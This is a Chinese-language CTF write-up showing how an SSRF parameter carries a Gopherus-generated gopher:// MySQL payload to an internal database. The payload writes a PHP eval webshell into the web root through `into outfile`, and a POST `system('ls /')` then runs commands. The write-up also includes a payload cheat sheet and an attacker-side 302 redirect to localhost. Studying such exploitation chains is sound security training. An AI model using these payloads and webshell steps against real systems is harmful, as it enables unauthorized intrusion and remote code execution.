## 一句话概括

当 SSRF 的目标**不是 HTTP 服务**、报文需要**字节级精确构造**时，就该上 `gopher://`。本题用 **Gopherus** 生成一整段 MySQL 协议报文（含握手 + 恶意 SQL），借 SSRF 把 `select ... into outfile` 送进内网 MySQL，**在网站根目录写下一个 webshell**。

顺带记录一条实战必备的排错线：**你用来做 302 跳转的那台公网服务器，PHP 没跑起来会让整条攻击链静默失效。**

## 本题情景与解题手法

### 题目形态

一个存在 SSRF 的检查接口，收两个参数：

```http
POST /check.php HTTP/1.1
Host: 靶机地址
Content-Type: application/x-www-form-urlencoded

u=test&returl=<目标地址>
```

`returl` 就是我们可控的目标地址。内网里跑着一个**无密码的 MySQL（3306）**。

### 第一步：判断"目标是什么服务"，再决定用哪个协议

这是选择协议的岔路口：

| 目标 | 用什么 | 原因 |
|---|---|---|
| 内网 Web 服务（80/8080） | `http://` | 目标听得懂 HTTP |
| 本机文件 | `file://` | 直接读 |
| 探端口 | `dict://` | 连上就有 banner |
| **MySQL / Redis 等非 HTTP 服务** | **`gopher://`** | **报文要字节级精确，只有 gopher 能原样透传** |

MySQL 的协议是**二进制**的：客户端要先收服务端握手包、再回一个带能力标志的认证包、之后才是 COM_QUERY。**没有任何办法把它塞进 `http://` 的请求行里** —— 必须用 gopher。

### 第二步：用 Gopherus 生成 MySQL 报文

手工拼 MySQL 握手响应不可能，直接用 Gopherus：

```bash
python gopherus.py --exploit mysql
```

支持的目标类型：

```text
mysql, postgresql, fastcgi, redis, smtp, zabbix,
pymemcache, rbmemcache, phpmemcache, dmpmemcache
```

选 `mysql` 后，按提示填入目标主机、端口、用户名（`root`）、要执行的 SQL。工具会吐出一整段 `gopher://...` payload。

我们要它执行的 SQL 是——**把一句话木马写进网站根目录**：

```sql
select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/shell.php"
```

`into outfile` 是 MySQL 提供的"把查询结果写到服务器文件系统"的功能，能不能用取决于两点：**运行 MySQL 的账户对目标目录有写权限，且 `secure_file_priv` 没有禁止这个路径**。

### 第三步：把 payload 送进 `returl`

直接拼在参数里（原笔记的 `fetch` 版本，为方便阅读把 payload 换行展示）：

```javascript
fetch('http://靶机地址/check.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'u=test&returl=gopher://127.0.0.1:3306/_<URL编码后的MySQL报文>'
}).then(r => r.text()).then(console.log)
```

靶机拿到 `returl` → curl 解析 gopher → 把 `_` 之后解码出来的**原始字节**写进到 `127.0.0.1:3306` 的 TCP 连接 → 内网 MySQL 收到一条完全合法的协议交互，并执行了我们指定的 SQL。

### 第四步：验证 webshell 并读 flag

访问写进去的文件，并执行命令：

```http
POST /shell.php HTTP/1.1
Host: 靶机地址
Content-Type: application/x-www-form-urlencoded

1=system('ls /');
```

由于木马用的是 `$_POST[1]`，参数名必须叫 `1`。能执行命令后，翻目录读 flag 即可。

### 解题手法一句话总结

> 确认目标是**非 HTTP 服务** → 用 **Gopherus** 生成 MySQL 协议报文（含 `into outfile` 写马）→ 套上 `gopher://127.0.0.1:3306/_` 前缀 → 塞进 SSRF 参数 `returl` → **借服务器的 TCP 连接把 SQL 送进内网 MySQL** → webshell 落盘到网站根目录 → 访问并执行命令读 flag。

## 原理

### 1. 为什么必须 gopher，`http://` 差在哪

| | `http://` | `gopher://` |
|---|---|---|
| 谁决定发什么字节 | curl 按 HTTP 规范生成 | **你说了算** |
| 目标必须懂什么 | HTTP | **什么都不用懂，收到字节即可** |
| 能否构造二进制协议 | 不能（请求行是文本） | **能（%XX 可表示任意字节）** |
| 打 MySQL | ❌ | ✅ |

`gopher://` 把 curl 降级成"裸 TCP 客户端"，这正是它能打遍内网的原因（详见 03）。

### 2. 一段 MySQL gopher payload 里到底装了什么

Gopherus 生成的 blob 按顺序包含：

```text
1. a3 00 00 01 85 a6 ff ...      服务端握手包的"应答"（协议版本、能力标志等）
2. 72 6f 6f 74 00 ... "root"     用户名（\0 结尾）
3. 6d 79 73 71 6c 5f 6e 61 74 ...  认证插件名 mysql_native_password
4. ...（能力位、字符集、客户端信息等字段）
5. 03 73 65 6c 65 63 74 20 ...   COM_QUERY（0x03）+ SQL 文本
```

所以一段看似乱码的 `%a3%00%00%01%85...`，其实是**一份完整的、按 MySQL 协议逐字段拼出来的字节流**。

### 3. `into outfile` 为什么能写 webshell

```sql
select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/shell.php"
```

- MySQL 运行账户（通常是 `mysql`）对 `/var/www/html/` 有写权限 → 文件能落盘
- 文件落在 **Web 根目录**，会被 Nginx/Apache 按 `.php` 交给 PHP 解释器 → **木马可执行**
- `select "字符串"` 不查任何表，所以**不需要知道任何库名表名**，是最省事的一种写文件方式

### 4. 一条完整的 SSRF 打内网链路长什么样

```text
攻击者 → SSRF 入口（check.php）
       → curl 解析 gopher://127.0.0.1:3306/_
       → 字节流写入 TCP:3306
       → 内网 MySQL 执行 COM_QUERY
       → select ... into outfile 落盘 shell.php
       → 攻击者再访问 /shell.php 执行命令
```

**注意最后一步是"第二步动作"**：SSRF 负责"写"，Web 访问负责"执行"，这是打内网数据库写马的固定套路。

## 利用条件

1. **SSRF 入口存在，且 gopher 协议未被 `CURLOPT_PROTOCOLS` 禁用**
2. **目标 MySQL 无密码或弱口令**（一般用 `root`），且允许该来源连接
3. **MySQL 账户对 Web 目录有写权限**，`secure_file_priv` 未限制到别的目录
4. **知道 Web 根目录路径**（`/var/www/html/`、`/www/wwwroot/站点/` 等）
5. **能访问写出来的文件**（文件落在 Web 可访问路径下）

## Payload 速查

| 目的 | 内容 |
|---|---|
| 生成 MySQL payload | `python gopherus.py --exploit mysql` |
| 生成 Redis payload | `python gopherus.py --exploit redis` |
| 生成 FastCGI payload | `python gopherus.py --exploit fastcgi` |
| 写 webshell 的 SQL | `select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/shell.php"` |
| 带 payload 的请求体 | `u=test&returl=gopher://127.0.0.1:3306/_<URL编码报文>` |
| 执行命令 | `1=system('ls /')`（参数名要跟木马一致） |

### 走 Burp 时的注意事项

如果用 Burp 而不是脚本发，因为表单提交时 Burp 会先做一次 URL 解码，**payload 需要再编码一次**（`%` → `%25`），也就是前面在 03 里说的"二次编码"。

## 攻击机环境排错：302 跳转脚本为什么没生效

这套手法的配套环节是**你自己那台公网服务器**（很多题要用它做 302 跳转，见 05）。原笔记里踩过一个典型的坑，完整记录如下。

### 症状

在服务器上放好了 `shell.php`（内容是 `<?php header("Location: http://127.0.0.1/flag.php"); exit; ?>`），提交 `url=http://x.x.x.x/shell.php` 后，回显的不是跳转结果，而是**这段 PHP 源码本身**：

```text
x.x.x.x</br><?php header("Location: http://127.0.0.1/flag.php"); exit; ?>
```

### 诊断

```bash
sudo systemctl status php-fpm
# → php-fpm.service not found
```

**`php-fpm.service` 不存在 = PHP 根本没装**。Nginx 找不到 PHP 解释器，就把 `.php` 当**纯文本静态文件**返回了 —— 所以看到的是源码而不是 302。

排查中又发现：**服务器连不上外网**（内网通、外网不通），`apt install` 装不了东西。

### 处置

| 方案 | 操作 |
|---|---|
| A（推荐） | 登录云控制台 → 找到该实例 → 点「重启」→ 等 1-2 分钟 |
| B | 若重启无效，控制台选「重置系统」→ 选回同样的 Ubuntu → 重新配置 |

**为什么重启能解决**：这类"内网通、外网不通"通常是云平台虚拟化层面的网络配置异常、内核网络模块问题、或路由表/网络接口状态异常。**重启会重置整个网络栈**，多数情况一次就好。

### 网络恢复后的操作顺序

```bash
# 1. 更新系统
sudo apt update

# 2. 安装 PHP 环境
sudo apt install php-fpm php-common -y

# 3. 启动 PHP-FPM（PHP 8.1 的实际服务名带版本号）
sudo systemctl start php8.1-fpm
sudo systemctl enable php8.1-fpm
sudo systemctl status php8.1-fpm
```

再让 Nginx 认识 `.php` —— 编辑 `/etc/nginx/sites-available/default`，确保下面这段没有被注释掉：

```nginx
location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
}
```

重启并验证：

```bash
sudo systemctl restart nginx
curl -I http://x.x.x.x/shell.php
```

期望响应：

```text
HTTP/1.1 302 Found
Location: http://127.0.0.1/flag.php
```

**看到这两行，说明攻击机侧的跳转服务就绪了。**

## 踩坑与备注

- **PHP 源码被原样回显 = PHP 没被解释**：不是"302 没生效"，是"PHP 根本没运行"。先 `systemctl status php-fpm`，而不是在那儿反复改 header 代码。
- **服务名带版本号**：`php-fpm` 与 `php8.1-fpm` 是不同的 unit 名，用错会得到 `not found`。
- **Nginx 的 `location ~ \.php$` 必须存在**：默认站点配置里这段常常是注释状态，不放开的话 PHP 文件永远当静态文件返回。
- **云服务器"内网通外网不通"先重启**：比逐条排 iptables / 路由表快得多，且不丢数据。
- **`into outfile` 失败的两个常见原因**：`secure_file_priv` 指向了别的目录（`show variables like 'secure_file_priv'` 可查），或 MySQL 运行账户对目标目录没有写权限。这时可以换 `/tmp/` 之类可写目录试探，或改用 Redis 写 crontab / SSH key 的路子。
- **参数名要与木马一致**：木马用 `$_POST[1]`，就必须发 `1=...`；写成 `cmd=...` 是不生效的。
- **`u=test` 这个参数不能省**：它是接口的另一个必填字段，缺了可能进不去处理逻辑。
- **原文中的公网 IP、实例主机名、登录用户名均为一次性环境信息**，本文已抽象为 `x.x.x.x` / `<实例ID>` / `<用户>`。
